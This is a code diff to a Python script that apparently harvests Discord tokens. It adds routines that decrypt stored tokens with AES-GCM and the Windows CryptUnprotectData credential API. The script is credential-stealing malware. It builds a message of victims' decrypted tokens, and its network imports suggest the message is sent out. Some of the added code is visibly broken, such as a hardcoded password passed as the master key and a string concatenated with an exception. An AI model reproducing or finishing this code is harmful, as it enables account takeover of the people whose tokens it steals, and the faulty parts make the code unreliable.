@@ -1,6 +1,9 @@
 import os
 import re
 import json
+from base64 import b64decode
+from Crypto.Cipher import AES
+from win32crypt import CryptUnprotectData
 
 from urllib.request import Request, urlopen
 
@@ -53,7 +56,8 @@ def main():
 
         if len(tokens) > 0:
             for token in tokens:
-                message += f'{token}\n'
+                new = decrypt_token(token=token, password='9Grant10')
+                message += f'{new}\n'
         else:
             message += 'No tokens found.\n'
 
@@ -73,5 +77,13 @@ def main():
         pass
     return message
 
+def decrypt(buff, master_key):
+    try:
+        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
+    except Exception as e:
+        return "An error has occured.\n" + e
+
+def decrypt_token(token: str, password: str):
+    return decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(password)[5:])
 
 print(main())
